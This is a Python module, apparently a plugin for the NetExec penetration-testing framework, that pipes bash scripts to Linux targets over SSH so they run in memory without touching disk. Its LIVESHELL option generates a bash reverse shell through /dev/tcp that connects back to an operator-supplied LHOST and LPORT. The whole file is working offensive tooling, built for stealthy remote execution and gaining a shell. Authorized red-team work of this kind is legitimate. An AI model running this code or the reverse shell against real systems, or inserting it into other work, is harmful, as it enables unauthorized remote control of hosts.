# nxc/modules/ephemeral.py
import time
import os

class NXCModule:
    name = "ephemeral"
    description = "Run bash scripts entirely in memory on a Linux target"
    supported_protocols = ["ssh"]
    opsec_safe = True
    multiple_hosts = False
    category = CATEGORY.ENUMERATION

    def __init__(self):
        self.conn = None
        self.transport = None
        self.script_path = None
        self.raw_command = None
        self.liveshell = False
        self.timeout = 60
        self.killfile = None
        self.lhost = None
        self.lport = None

    def options(self, context, module_options):
        self.script_path = module_options.get("SCRIPT")
        self.raw_command = module_options.get("COMMAND")
        self.liveshell = module_options.get("LIVESHELL", False)
        self.timeout = int(module_options.get("TIMEOUT", 60))
        self.killfile = module_options.get("KILLFILE")
        self.lhost = module_options.get("LHOST")
        self.lport = int(module_options.get("LPORT")) if module_options.get("LPORT") else None

        if self.liveshell and not self.timeout:
            self.timeout = 60  # default timeout

        # Use context logger (no custom prefix; nxc_logger will add module metadata)
        context.log.display(
            f"ephemeral: LIVESHELL={self.liveshell}, TIMEOUT={self.timeout}, "
            f"LHOST={self.lhost}, LPORT={self.lport}, KILLFILE={self.killfile}"
        )

    def on_login(self, context, connection):
        # Connection should expose a paramiko-like client at connection.conn
        if not hasattr(connection, "conn") or connection.conn is None:
            context.log.fail("ephemeral: SSH client not found on connection.")
            return

        self.conn = connection.conn

        try:
            # prefer transport/session if available, but exec_command on client is simpler
            if self.script_path:
                with open(self.script_path, "r") as f:
                    script_content = f.read()
            elif self.raw_command:
                script_content = self.raw_command
            elif getattr(connection.args, "execute", None):
                script_content = connection.args.execute
            elif self.liveshell:
                script_content = self._generate_reverse_shell()
                if not script_content:
                    context.log.fail("ephemeral: LHOST/LPORT must be set for LIVESHELL.")
                    return
            else:
                context.log.fail("ephemeral: No commands to execute.")
                return

            # Start the command synchronously and stream output
            # Use stdbuf so scripts that buffer behave more like "live"
            stdin, stdout, stderr = self.conn.exec_command("stdbuf -oL -eL bash -s", timeout=self.timeout)
            # send the script
            stdin.write(script_content)
            stdin.write("\n")
            stdin.flush()
            stdin.channel.shutdown_write()

            # Stream output until command finishes or killfile detected or timeout
            start_time = time.time()
            channel = stdout.channel  # underlying Channel
            while not channel.exit_status_ready():
                # timeout enforcement
                if self.timeout and (time.time() - start_time) > self.timeout:
                    context.log.fail(f"ephemeral: Execution timed out after {self.timeout} seconds.")
                    try:
                        channel.close()
                    except Exception:
                        pass
                    break

                # killfile check
                if self.killfile and os.path.exists(self.killfile):
                    context.log.display(f"ephemeral: Killfile {self.killfile} detected; terminating execution.")
                    try:
                        channel.close()
                    except Exception:
                        pass
                    break

                # stdout
                if stdout.channel.recv_ready():
                    try:
                        out = stdout.channel.recv(4096)
                        if out:
                            # decode and stream
                            context.log.display(out.decode(errors="ignore").rstrip())
                    except Exception as e:
                        context.log.fail(f"ephemeral: Error reading stdout: {e}")
                        break

                # stderr
                if stderr.channel.recv_stderr_ready():
                    try:
                        err = stderr.channel.recv_stderr(4096)
                        if err:
                            # use fail for error content per NetExec suggestion
                            context.log.fail(err.decode(errors="ignore").rstrip())
                    except Exception as e:
                        context.log.fail(f"ephemeral: Error reading stderr: {e}")
                        break

                time.sleep(0.05)

            # Drain any remaining data
            try:
                while stdout.channel.recv_ready():
                    out = stdout.channel.recv(4096)
                    if out:
                        context.log.display(out.decode(errors="ignore").rstrip())
                while stderr.channel.recv_stderr_ready():
                    err = stderr.channel.recv_stderr(4096)
                    if err:
                        context.log.fail(err.decode(errors="ignore").rstrip())
            except Exception:
                # If draining fails, it's non-fatal for logging
                pass

            # final exit code
            try:
                exit_code = channel.recv_exit_status()
                if exit_code == 0:
                    context.log.display(f"ephemeral: Finished with exit code: {exit_code}")
                else:
                    context.log.fail(f"ephemeral: Finished with non-zero exit code: {exit_code}")
            except Exception:
                context.log.fail("ephemeral: Could not retrieve exit status.")

            # Do NOT close self.conn here; let connection owner manage lifecycle
            context.log.display("ephemeral: Execution complete (connection left open).")

        except Exception as e:
            context.log.fail(f"ephemeral: Execution error: {e}")
            # do not forcibly close the connection here

    def _generate_reverse_shell(self):
        if self.lhost and self.lport:
            return f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        return ""
